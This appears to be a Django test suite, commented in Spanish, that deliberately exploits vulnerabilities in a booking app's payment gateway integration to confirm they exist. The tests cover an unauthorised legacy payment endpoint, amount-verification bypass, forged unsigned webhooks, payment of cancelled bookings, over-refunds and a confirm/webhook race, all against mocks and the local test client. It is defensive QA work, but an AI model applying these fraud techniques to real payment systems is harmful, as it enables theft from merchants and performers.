"""
QA de estrés / exploits de la pasarela de pagos.

Corre con:
    python manage.py test payments.tests_stress --keepdb -v 2

Cada test intenta EXPLOTAR una vulnerabilidad. Si el test "pasa" (assert de que
el exploit funcionó) => la vuln EXISTE. Los prints dejan claro qué pasó.

NOTA sobre concurrencia: la DB de test es SQLite, que serializa escrituras y
trata select_for_update como no-op. Por eso el test de carrera es "best-effort":
si reproduce el doble-Payment en SQLite, en Postgres sin el lock correcto es igual
o peor. Si NO lo reproduce, NO garantiza que Postgres esté a salvo.
"""
import json
import threading
from datetime import date, time, timedelta
from decimal import Decimal
from unittest.mock import patch

from django.contrib.auth import get_user_model
from django.test import Client, TransactionTestCase
from rest_framework.test import APIClient

from bookings.models import Booking, Payment
from talents.models import TalentProfile
from payments.models import PaguelofacilTransaction, Payout
from payments import views as pv

User = get_user_model()

WARN = '[!] EXPLOIT OK:'   # ASCII only (Windows console = cp1252)


def _mk_world(quoted='500.00'):
    """Crea cliente, DJ y una reserva pagable."""
    import uuid
    tag = uuid.uuid4().hex[:8]
    client = User.objects.create_user(username=f'cli_{tag}', email=f'cli_{tag}@t.com', password='x')
    dj_user = User.objects.create_user(username=f'dj_{tag}', email=f'dj_{tag}@t.com', password='x', role='talent')
    talent = TalentProfile.objects.create(
        user=dj_user, talent_type='dj', talent_level='standard',
        stage_name='DJ Test', hourly_rate=Decimal('100.00'),
    )
    booking = Booking.objects.create(
        client=client, talent=talent,
        event_type='fiesta', event_date=date.today() + timedelta(days=30),
        event_time_start=time(20, 0), event_time_end=time(23, 0),
        event_location='Panama', quoted_price=Decimal(quoted),
        status='pendiente_pago',
    )
    return client, dj_user, talent, booking


def _init_tx(booking, client, amount='500.00', status='initiated'):
    return PaguelofacilTransaction.objects.create(
        booking=booking, client=client, amount=Decimal(amount),
        internal_reference=f'PLS-{booking.id:016X}', status=status,
    )


# PFL "aprobada" reportando un monto arbitrario (para el bypass de monto)
def _fake_pfl_response(amount):
    return {
        'success': True,
        'headerStatus': {'code': 200},
        'data': [{'status': 1, 'authStatus': '00', 'totalPay': str(amount), 'codOper': 'AUTH_CAP-FAKE'}],
    }


class PaymentGatewayExploits(TransactionTestCase):
    reset_sequences = True

    # ─────────────────────────────────────────────────────────────
    def test_C0_legacy_endpoint_bypasses_gateway(self):
        """CRITICO 0: /payments/create/ marca pagada una reserva sin pasarela."""
        client, dj, talent, booking = _mk_world()
        attacker = User.objects.create_user(username='atk', email='atk@t.com', password='x')

        c = APIClient()
        c.force_authenticate(user=attacker)             # NO es el cliente de la reserva
        resp = c.post('/api/payments/create/', {
            'booking': booking.id, 'amount': '0.01',
            'payment_type': 'full', 'payment_method': 'card',
        }, format='json')

        paid = Payment.objects.filter(booking=booking, payment_status='completed').exists()
        print(f'\n[C0] status={resp.status_code} pago_completed_creado={paid}')
        if paid:
            p = Payment.objects.get(booking=booking)
            print(f'[C0] {WARN} atacante(id={attacker.id}) marco reserva de ${booking.quoted_price} '
                  f'como pagada con ${p.amount}. Payment.client={p.client_id}')
        self.assertTrue(paid, 'Se esperaba que el endpoint legacy permitiera el bypass (vuln presente).')

    # ─────────────────────────────────────────────────────────────
    def test_C1_confirm_no_verifica_monto(self):
        """CRITICO 1: confirm/ aprueba aunque PFL reporte un monto menor."""
        client, dj, talent, booking = _mk_world(quoted='500.00')
        tx = _init_tx(booking, client, amount='500.00')

        c = APIClient()
        c.force_authenticate(user=client)
        with patch('payments.views.query_transaction', return_value=_fake_pfl_response('1.00')):
            resp = c.post('/api/payments/paguelofacil/confirm/', {
                'internal_reference': tx.internal_reference, 'cod_oper': 'AUTH_CAP-FAKE',
            }, format='json')

        tx.refresh_from_db()
        print(f'\n[C1] status={resp.status_code} tx.status={tx.status} tx.amount={tx.amount} (PFL reporto $1.00)')
        if tx.status == 'approved':
            print(f'[C1] {WARN} reserva de $500 aprobada pagando $1. El Payout al DJ se genera por el total.')
        self.assertEqual(tx.status, 'approved', 'Se esperaba aprobacion sin verificar monto (vuln presente).')

    # ─────────────────────────────────────────────────────────────
    def test_C2_webhook_falsificable(self):
        """CRITICO 2: webhook sin firma marca aprobada una tx."""
        client, dj, talent, booking = _mk_world()
        tx = _init_tx(booking, client, amount='500.00', status='initiated')

        # raise_request_exception=False → capturamos el 500 en vez de propagarlo.
        c = Client(raise_request_exception=False)
        forged = {'status': 1, 'PARM_1': tx.internal_reference,
                  'codOper': 'AUTH_CAP-FORGED', 'totalPay': '500.00'}
        resp = c.post('/api/payments/paguelofacil/webhook/',
                      data=json.dumps(forged), content_type='application/json')

        tx.refresh_from_db()
        approved = tx.status == 'approved'
        print(f'\n[C2] status={resp.status_code} tx.status={tx.status}')
        if resp.status_code == 500:
            print(f'[C2] {WARN} (bug distinto) WebhookView crashea con 500: lee request.body '
                  f'despues de request.data (RawPostDataException). El webhook NUNCA funciona por HTTP '
                  f'-> las notificaciones REALES de PFL tambien fallan. La forja queda bloqueada por accidente, '
                  f'no por la verificacion de firma (que devuelve True sin secret).')
        elif approved:
            print(f'[C2] {WARN} webhook forjado (sin firma, anonimo) marco la tx aprobada.')
        # El bug es real en cualquiera de los dos caminos:
        self.assertTrue(resp.status_code == 500 or approved,
                        'Webhook: o crashea con 500 (roto), o acepta forja (inseguro). Ambos son bugs.')

    # ─────────────────────────────────────────────────────────────
    def test_I4_guard_estado_espanol_muerto(self):
        """IMPORTANTE 4: init/ permite pagar una reserva cancelada (guard en ingles)."""
        client, dj, talent, booking = _mk_world()
        booking.status = 'cancelada'
        booking.save()

        c = APIClient()
        c.force_authenticate(user=client)
        with patch('payments.paguelofacil.PaguelofacilConfig.cclw', return_value='CCLW'), \
             patch('payments.paguelofacil.PaguelofacilConfig.access_token', return_value='PUB|PRIV'):
            resp = c.post('/api/payments/paguelofacil/init/', {
                'booking_id': booking.id, 'amount': '500.00', 'payment_type': 'full',
            }, format='json')

        print(f'\n[I4] status={resp.status_code} sobre reserva CANCELADA')
        if resp.status_code == 200:
            print(f'[I4] {WARN} se inicio pago de una reserva cancelada (el guard en ingles nunca matchea).')
        self.assertEqual(resp.status_code, 200, 'Se esperaba que dejara pagar reserva cancelada (vuln presente).')

    # ─────────────────────────────────────────────────────────────
    def test_I5_refund_parcial_sin_tope(self):
        """IMPORTANTE 5: refunds parciales acumulados superan el monto cobrado."""
        from payments.services import process_refund
        client, dj, talent, booking = _mk_world()
        tx = _init_tx(booking, client, amount='100.00', status='approved')
        tx.paguelofacil_id = 'AUTH_CAP-X'
        Payment.objects.create(booking=booking, client=client, amount=Decimal('100.00'),
                               payment_type='full', payment_status='completed', payment_method='card')
        tx.payment = Payment.objects.filter(booking=booking).first()
        tx.save()

        total_refunded = Decimal('0')
        with patch('payments.paguelofacil.refund', return_value={'success': True}):
            for i in range(3):                          # 3 x $60 = $180 sobre una tx de $100
                try:
                    process_refund(tx, Decimal('60.00'), reason=f'parcial {i}')
                    total_refunded += Decimal('60.00')
                    tx.refresh_from_db()
                except Exception as e:
                    print(f'[I5] refund {i} bloqueado: {e}')
                    break

        print(f'\n[I5] total reembolsado=${total_refunded} sobre tx de $100 (status={tx.status})')
        if total_refunded > Decimal('100.00'):
            print(f'[I5] {WARN} se reembolso ${total_refunded} sobre una tx de $100 (sin tope acumulado).')
        self.assertGreater(total_refunded, Decimal('100.00'),
                           'Se esperaba over-refund por falta de tope acumulado (vuln presente).')


class PaymentConcurrencyStress(TransactionTestCase):
    reset_sequences = True

    def test_double_payment_confirm_vs_webhook(self):
        """
        STRESS: confirm/ y webhook/ concurrentes sobre la MISMA tx.
        Riesgo: 2 Payments + 2 Payouts (webhook usa .filter().first() sin lock).
        """
        client, dj, talent, booking = _mk_world()
        tx = _init_tx(booking, client, amount='500.00', status='initiated')
        barrier = threading.Barrier(2)
        errors = []

        def do_confirm():
            try:
                barrier.wait()
                with patch('payments.views.query_transaction', return_value=_fake_pfl_response('500.00')):
                    c = APIClient()
                    c.force_authenticate(user=client)
                    c.post('/api/payments/paguelofacil/confirm/',
                           {'internal_reference': tx.internal_reference, 'cod_oper': 'AUTH_CAP-FAKE'},
                           format='json')
            except Exception as e:
                errors.append(('confirm', repr(e)))

        def do_webhook():
            try:
                barrier.wait()
                c = APIClient()
                c.post('/api/payments/paguelofacil/webhook/',
                       {'status': 1, 'PARM_1': tx.internal_reference,
                        'codOper': 'AUTH_CAP-FAKE', 'totalPay': '500.00'},
                       format='json')
            except Exception as e:
                errors.append(('webhook', repr(e)))

        t1 = threading.Thread(target=do_confirm)
        t2 = threading.Thread(target=do_webhook)
        t1.start(); t2.start(); t1.join(); t2.join()

        n_payments = Payment.objects.filter(booking=booking).count()
        n_payouts = Payout.objects.filter(booking=booking).count()
        print(f'\n[RACE] Payments={n_payments} Payouts={n_payouts} errores={errors}')
        if n_payments > 1 or n_payouts > 1:
            print('[RACE] ⚠️  DOBLE registro reproducido: falta lock compartido entre confirm y webhook.')
        else:
            print('[RACE] No se reprodujo doble registro en SQLite (NO garantiza Postgres — ver caveat).')
        # No hacemos assert duro: SQLite serializa. Reportamos el número.
        self.assertLessEqual(n_payments, 2)
